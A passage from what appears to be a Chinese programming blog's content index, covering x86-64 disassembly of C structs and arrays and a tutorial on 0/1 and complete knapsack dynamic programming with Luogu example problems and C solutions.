class="token operator">*</span>name<span class="token punctuation">;</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">int</span> height<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> person <span class="token operator">*</span>man<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">struct</span> person<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> person<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>name<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>age<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">;</span>    man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>height<span class="token operator">=</span><span class="token number">180</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-assembly"><code class="language-assembly">401156:    55                       push   rbp401157:    48 89 e5                 mov    rbp,rsp40115a:    53                       push   rbx40115b:    48 83 ec 18              sub    rsp,0x1840115f:    bf 38 00 00 00           mov    edi,0x38401164:    e8 d7 fe ff ff           call   401040 <malloc@plt>401169:    48 89 05 f0 2e 00 00     mov    QWORD PTR [rip+0x2ef0],rax        # 404060 <man>401170:    48 8b 1d e9 2e 00 00     mov    rbx,QWORD PTR [rip+0x2ee9]        # 404060 <man>401177:    bf 10 00 00 00           mov    edi,0x1040117c:    e8 bf fe ff ff           call   401040 <malloc@plt>401181:    48 89 03                 mov    QWORD PTR [rbx],rax401184:    48 8b 05 d5 2e 00 00     mov    rax,QWORD PTR [rip+0x2ed5]        # 404060 <man>40118b:    c7 40 08 12 00 00 00     mov    DWORD PTR [rax+0x8],0x12401192:    48 8b 05 c7 2e 00 00     mov    rax,QWORD PTR [rip+0x2ec7]        # 404060 <man>401199:    c7 40 0c b4 00 00 00     mov    DWORD PTR [rax+0xc],0xb44011a0:    c7 45 ec 00 00 00 00     mov    DWORD PTR [rbp-0x14],0x04011a7:    eb 1b                    jmp    4011c4 <main+0x6e>4011a9:    48 8b 05 b0 2e 00 00     mov    rax,QWORD PTR [rip+0x2eb0]        # 404060 <man>4011b0:    8b 55 ec                 mov    edx,DWORD PTR [rbp-0x14]4011b3:    48 63 d2                 movsxd rdx,edx4011b6:    48 8d 4a 04              lea    rcx,[rdx+0x4]4011ba:    8b 55 ec                 mov    edx,DWORD PTR [rbp-0x14]4011bd:    89 14 88                 mov    DWORD PTR [rax+rcx*4],edx4011c0:    83 45 ec 01              add    DWORD PTR [rbp-0x14],0x14011c4:    83 7d ec 09              cmp    DWORD PTR [rbp-0x14],0x94011c8:    7e df                    jle    4011a9 <main+0x53>4011ca:    b8 00 00 00 00           mov    eax,0x04011cf:    48 83 c4 18              add    rsp,0x184011d3:    5b                       pop    rbx4011d4:    5d                       pop    rbp4011d5:    c3                       ret    </code></pre><p>C代码中定义了一个结构体，然后定义了五个结构体指针，我仅仅对一个结构体指针进行了初始化，更好的观察结构体在汇编代码中的实现</p><p>首先是给结构体分配内存</p><pre class=" language-c"><code class="language-c">man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">struct</span> person<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> person<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这一句对应着的汇编代码如下</p><pre class=" language-assembly"><code class="language-assembly">40115f:    bf 38 00 00 00           mov    edi,0x38401164:    e8 d7 fe ff ff           call   401040 <malloc@plt>401169:    48 89 05 f0 2e 00 00     mov    QWORD PTR [rip+0x2ef0],rax </code></pre><p>malloc的参数为0x38，返回值是一个指针，汇编中结果一般放在eax寄存器中，所以这里malloc的返回值直接存入了eax，然后将rax的值存入<strong>$rip+0x2ef0</strong>指向的地址，这里是一个相对寻址，未初始化的全局变量是存储在bss段的。</p><p>再看到这三句代码</p><pre class=" language-c"><code class="language-c">man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>name<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>age<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">;</span>man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>height<span class="token operator">=</span><span class="token number">180</span><span class="token punctuation">;</span></code></pre><p>对应的汇编代码为</p><pre class=" language-assembly"><code class="language-assembly">401170:    48 8b 1d e9 2e 00 00     mov    rbx,QWORD PTR [rip+0x2ee9]        # 404060 <man>401177:    bf 10 00 00 00           mov    edi,0x1040117c:    e8 bf fe ff ff           call   401040 <malloc@plt>401181:    48 89 03                 mov    QWORD PTR [rbx],rax401184:    48 8b 05 d5 2e 00 00     mov    rax,QWORD PTR [rip+0x2ed5]        # 404060 <man>40118b:    c7 40 08 12 00 00 00     mov    DWORD PTR [rax+0x8],0x12401192:    48 8b 05 c7 2e 00 00     mov    rax,QWORD PTR [rip+0x2ec7]        # 404060 <man>401199:    c7 40 0c b4 00 00 00     mov    DWORD PTR [rax+0xc],0xb4</code></pre><p>首先将man[0]的值(即malloc(0x38)的返回值)存入rbx，然后调用malloc，分配name指针，然后将指针存入man[0]的值指向的地址，实际上在堆区，然后再将man[0]的值存入rax，往*(man[0]+8)写入0x12，接着继续往</p><p>*(man[0]+0xc)写入0xb4</p><p>还剩下最后一段，给数组循环赋值</p><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span></code></pre><pre class=" language-assembly"><code class="language-assembly">4011a0:    c7 45 ec 00 00 00 00     mov    DWORD PTR [rbp-0x14],0x04011a7:    eb 1b                    jmp    4011c4 <main+0x6e>4011a9:    48 8b 05 b0 2e 00 00     mov    rax,QWORD PTR [rip+0x2eb0]        # 404060 <man>4011b0:    8b 55 ec                 mov    edx,DWORD PTR [rbp-0x14]4011b3:    48 63 d2                 movsxd rdx,edx4011b6:    48 8d 4a 04              lea    rcx,[rdx+0x4]4011ba:    8b 55 ec                 mov    edx,DWORD PTR [rbp-0x14]4011bd:    89 14 88                 mov    DWORD PTR [rax+rcx*4],edx4011c0:    83 45 ec 01              add    DWORD PTR [rbp-0x14],0x14011c4:    83 7d ec 09              cmp    DWORD PTR [rbp-0x14],0x94011c8:    7e df                    jle    4011a9 <main+0x53></code></pre><p>首先定义变量i，然后跳转，和9进行大小比较，如果小于等于9则跳转，然后将<em>man[0]存入rax，将i存入edx，下面的<strong>movsxd rdx,edx</strong>是将edx由32位扩展为64位，将高32位置为第31位(即edx的最高位)的值，扩展了位数，数值保持不变，接着将i+4存入rcx，将i存入edx，将edx的值传给\</em>(man[0])+$rcx<em>\</em>4,这样，一开始i=0，i+4=4,edx=0，即将0传入*(man[0])+4<em>4=\</em>(man[0])+0x10处，*(man[0])存入了name，*(man[0])+0x8存入了age，*(man[0])+0xc存入了hieght，所以x[0]正好是存放在*(man[0])+0x10地址处的，剩下的数存入的地址也是每次增加4字节，那么，整个结构体的大概结构图如下</p><pre><code>0x404060:man[0]-----                    |                    |                            ----&gt;  -----------                          |              |                          |      *name      |----------                          |              |            |                           -----------            |                          |              |            |                              |       age      |            |                          |              |            |                            -----------            |                          |              |            |                          |      height  |            |                          |              |            |                            -----------            |                          |              |            |                          |      x[10]      |            |                          |              |            |                           -----------            |                                                   |                                                   ------&gt;  --------                                                           |         |                                                           |  name  |                                                           |        |                                                            --------</code></pre><h2 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h2><p>这个demo主要是分析数组实现</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-assembly"><code class="language-assembly">  401156:    55                       push   rbp  401157:    48 89 e5                 mov    rbp,rsp  40115a:    48 83 ec 40              sub    rsp,0x40  40115e:    64 48 8b 04 25 28 00     mov    rax,QWORD PTR fs:0x28  401165:    00 00   401167:    48 89 45 f8              mov    QWORD PTR [rbp-0x8],rax  40116b:    31 c0                    xor    eax,eax  40116d:    c7 45 cc 00 00 00 00     mov    DWORD PTR [rbp-0x34],0x0  401174:    eb 10                    jmp    401186 <main+0x30>  401176:    8b 45 cc                 mov    eax,DWORD PTR [rbp-0x34]  401179:    48 98                    cdqe     40117b:    8b 55 cc                 mov    edx,DWORD PTR [rbp-0x34]  40117e:    89 54 85 d0              mov    DWORD PTR [rbp+rax*4-0x30],edx  401182:    83 45 cc 01              add    DWORD PTR [rbp-0x34],0x1  401186:    83 7d cc 09              cmp    DWORD PTR [rbp-0x34],0x9  40118a:    7e ea                    jle    401176 <main+0x20>  40118c:    b8 00 00 00 00           mov    eax,0x0  401191:    48 8b 4d f8              mov    rcx,QWORD PTR [rbp-0x8]  401195:    64 48 33 0c 25 28 00     xor    rcx,QWORD PTR fs:0x28  40119c:    00 00   40119e:    74 05                    je     4011a5 <main+0x4f>  4011a0:    e8 8b fe ff ff           call   401030 <__stack_chk_fail@plt>  4011a5:    c9                       leave    4011a6:    c3                       ret    </code></pre><p>其实分析过上面的结构体的数组，这个就很清楚了，</p><pre class=" language-assembly"><code class="language-assembly">40116d:    c7 45 cc 00 00 00 00     mov    DWORD PTR [rbp-0x34],0x0401174:    eb 10                    jmp    401186 <main+0x30></code></pre><p>这一句定义变量i，然后跳转</p><pre class=" language-assembly"><code class="language-assembly">401186:    83 7d cc 09              cmp    DWORD PTR [rbp-0x34],0x940118a:    7e ea                    jle    401176 <main+0x20></code></pre><p>两段加起来就是for循环了</p><pre class=" language-assembly"><code class="language-assembly">401176:    8b 45 cc                 mov    eax,DWORD PTR [rbp-0x34]401179:    48 98                    cdqe   40117b:    8b 55 cc                 mov    edx,DWORD PTR [rbp-0x34]40117e:    89 54 85 d0              mov    DWORD PTR [rbp+rax*4-0x30],edx401182:    83 45 cc 01              add    DWORD PTR [rbp-0x34],0x1</code></pre><p>这里就能看出，a[10]是从$rbp-0x30开始存储的，一个值占用四个字节，所以根据这两个demo，我们可以知道，数组连续占用一块内存，和其他局部变量一样都是通过$rbp寻址，再看最后一个demo，bss段的数组</p><h2 id="demo3-1"><a href="#demo3-1" class="headerlink" title="demo3"></a>demo3</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-assembly"><code class="language-assembly">  401146:    55                       push   rbp  401147:    48 89 e5                 mov    rbp,rsp  40114a:    c7 45 fc 00 00 00 00     mov    DWORD PTR [rbp-0x4],0x0  401151:    eb 13                    jmp    401166 <main+0x20>  401153:    8b 45 fc                 mov    eax,DWORD PTR [rbp-0x4]  401156:    48 98                    cdqe     401158:    8b 55 fc                 mov    edx,DWORD PTR [rbp-0x4]  40115b:    89 14 85 60 40 40 00     mov    DWORD PTR [rax*4+0x404060],edx  401162:    83 45 fc 01              add    DWORD PTR [rbp-0x4],0x1  401166:    83 7d fc 09              cmp    DWORD PTR [rbp-0x4],0x9  40116a:    7e e7                    jle    401153 <main+0xd>  40116c:    b8 00 00 00 00           mov    eax,0x0  401171:    5d                       pop    rbp  401172:    c3                       ret    </code></pre><p>这个demo中数组是未初始化的全局变量，汇编代码中和上一个的差别在于寻址</p><pre class=" language-assembly"><code class="language-assembly">40115b:    89 14 85 60 40 40 00     mov    DWORD PTR [rax*4+0x404060],edx</code></pre><p>局部变量数组通过$rbp寻址，而全局变量数组直接通过数组在bss段中的地址来寻址</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态规划 </tag>
            
            <tag> C </tag>
            
            <tag> 背包问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划的背包问题</title>
      <link href="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/"/>
      <url>/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="01背包和完全背包"><a href="#01背包和完全背包" class="headerlink" title="01背包和完全背包"></a>01背包和完全背包</h2><p>记录一下这两天学习的动态规划算法，拖了好久了</p><a id="more"></a><p>动态规划可以说是递归的升级版，甚至可以替代BFS和DFS，能熟练掌握的话就不用再就纠结用什么搜索算法好了<br>这两天在洛谷上刷了一下动态规划地背包算法部分，深感DP的便利，用贪心算法的话要写一大篇代码<br>进入正题<br>背包算法可分为01背包，完全背包和多重背包，在这里主要记录前两种，先贴出两种背包算法的核心代码<br>完全背包代码段：</p><pre class=" language-c"><code class="language-c">    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>V<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这是01背包的核心代码段：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>m<span class="token punctuation">;</span>j<span class="token operator">>=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>可以看出，完全背包和01背包的差别仅仅在于第二次遍历的方向，前者是正向遍历，而后者是逆向遍历</p><h2 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a>01背包</h2><p>先讲解01背包</p><pre class=" language-bash"><code class="language-bash">问题描述:01背包是在N件物品取出若干件放在空间为C的背包里，每件物品的体积为W1，W2至Wn，与之相对应的价值为V1,V2至Vn。01背包是背包问题中最简单的问题。01背包的约束条件是给定几种物品，每种物品有且只有一个，并且有权值和体积两个属性</code></pre><h3 id="DP三步解题思路"><a href="#DP三步解题思路" class="headerlink" title="DP三步解题思路"></a>DP三步解题思路</h3><p>解题思路:<br>一般而言，DP题都有三个步骤:</p><pre class=" language-bash"><code class="language-bash">1.确定dp数组的含义，即dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span>所代表的意义2.确定dp递推表达式，即dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span>由什么可以推导而来3.确定dp数组初值，和递归一样，dp同样也需要初值，否则就会陷入死循环</code></pre><p>再来看01背包问题<br>每种物品只有一个，对于任何一个物品，我们的选择只有两种:装入背包或者不装如背包</p><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><p>这里我们以洛谷动态规划的背包部分第一题为例</p><pre><code>P1060 开心的金明金明今天很开心，家里购置的新房就要领钥匙了，新房里有一间他自己专用的很宽敞的房间。更让他高兴的是，妈妈昨天对他说：“你的房间需要购买哪些物品，怎么布置，你说了算，只要不超过NN元钱就行”。今天一早金明就开始做预算，但是他想买的东西太多了，肯定会超过妈妈限定的NN元。于是，他把每件物品规定了一个重要度，分为55等：用整数1-51−5表示，第55等最重要。他还从因特网上查到了每件物品的价格（都是整数元）。他希望在不超过NN元（可以等于NN元）的前提下，使每件物品的价格与重要度的乘积的总和最大。设第j件物品的价格为v[j],重要度为w[j]共选中了k件物品编号依次为j1,j2,…,jk,则所求的总和为：v[j1]*w[j1]+v[j2]*w[j2]+...+v[jk]*w[jk]请你帮助金明设计一个满足要求的购物单。</code></pre><p>典型的01背包题<br><code>在有限的背包容量下，怎样装入物品能使装入的物品的权重最大</code><br>首先确定我们的dp数组表达式，dp[i]代表着什么<br>根据题意，我们要求的是如何使在不超过背包容量的情况下使装入背包物品的权重最大<br>那我们就顺着题意假设:dp[i]为当背包容量为i时，不装入第j件物品时的最大权重<br>在这道题里就是:dp[i]为当我们的钱为i时，不买第j件物品时的最大权重</p><p>第二步，确定递推表达式dp[i]可以从什么推导而来<br>我们想，第j件物品可以装入可以不装入，而可以选择装入或者不装入的前提是，我们背包的剩余容量要大于等于这件物品所占的体积,在这道题里就是我们剩余的钱要大于等于第j个物品的价格，即i&gt;=v[j]<br>那么，当不装入这件物品时，dp[i]不变(不要忘了我们对数组的定义),当装入时，<code>dp[i]=dp[i-v[i]]+v[j]*w[i]</code>,因为我们装入了第j件物品，相应的我们剩下的钱就是当前的钱i-v[j],我们的权重就相应的增加v[j]*w[j]<br>这样一来，我们要求的dp[i]就是在买和不买两者间选择较大的那一方<br>递推公式就为</p><pre class=" language-c"><code class="language-c">dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span>v<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>v<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">*</span>w<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>第三步，求初值<br>事实上，这种背包问题并不需要我们特意求初值，因为我们递推公式的成立是有条件的，相当于已经设定了一个初始值。</p><p>三部分都已经确定好了，接下来就是用代码表达出来了</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"stdio.h"</span></span><span class="token keyword">int</span> v<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span>p<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span>w<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">50000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> x<span class="token operator">></span>y<span class="token operator">?</span>x<span class="token punctuation">:</span>y<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>n<span class="token punctuation">;</span>j<span class="token operator">>=</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>代码很简单，核心代码只有短短几行而已，换做是用贪心来求的话可就麻烦多了</p><h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><p>再来一题<br><img src="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/1.jpg" alt=""><br>还是先确定dp数组的含义<br>我们要求的是，把钱花光有多少种方法，依然是每种菜只能上一次,没有跳出01背包的范围<br>这次我们用二维数组，dp[i][j]，dp[i][j]表示:前i种菜且未上第i盘菜时，余额为j的情况下的点菜方法数<br>可能有点绕，不过往下看就懂了</p><p>再求递推公式<br>首先，和上一题一样，我们能对第i种菜作出上或者不上选择的前提是我们的余额大于等于第i种菜的价格，即<code>j&gt;= a[i]</code>.当<code>j&lt;a[i]</code>时，dp[i][j]就等于前一种状态的数值，即<code>dp[i][j]=dp[i-1][j]</code><br>再来看<code>j&gt;= a[i]</code>的情况，&gt;=的情况可以分开来谈，我们先看=的情况<br>在此之前我们再次明确一下dp数组的定义，<code>dp[i][j]表示:前i种菜且未上第i盘菜时，余额为j的情况下的点菜方法数</code>，注意，是方法数<br>当我们的余额j等于第i种菜的价格a[i]时，相对于上一个状态我们就多了一种方法，就是要第i种菜，要了第i种菜后我们的余额就变成了0，就买不了其他的菜了，所以在<code>j=a[i]</code>这种情况下，递推公式就是<code>dp[i][j]=d[i-1][j]+1</code><br>再看j&gt;a[i]的情况，这种情况下我们的余额在买完第i种菜后还有剩余，可能可以继续买剩下的菜，所以我们的方法数就演变成了不买这盘菜和买这盘菜的方法总和，递推公式为<code>dp[i][j]=dp[i-1][j]+dp[i-1][j-a[i]]</code><br>这样一来我们的dp递推公式就求完了</p><p>第三步，求初值<br>和上一题一样，同样不需要求初值，i和j的取值都是有范围的</p><p>代码如下</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"stdio.h"</span></span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10001</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token 